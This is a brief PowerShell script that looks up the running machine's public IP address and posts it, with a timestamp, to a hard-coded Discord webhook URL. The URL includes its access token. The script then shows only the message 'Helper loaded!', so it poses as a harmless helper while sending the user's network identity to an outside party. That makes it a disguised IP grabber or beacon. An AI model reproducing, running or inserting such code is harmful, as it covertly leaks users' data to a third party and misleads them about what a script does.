param(
    [string]$WebhookUrl = "https://discord.com/api/webhooks/1541943531935895572/WWdRbjIXSfQkRrdq4yuMWc5S9PPiocFXL1kOl9feDsfMfB5UWeI3a_jxbqFDevYwmy1x" 
)

$ip = Invoke-RestMethod -Uri "https://api.ipify.org" -UseBasicParsing

$body = @{ ipAddress = $ip; timestamp = (Get-Date) } | ConvertTo-Json
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json"

Write-Host "Helper loaded!"   
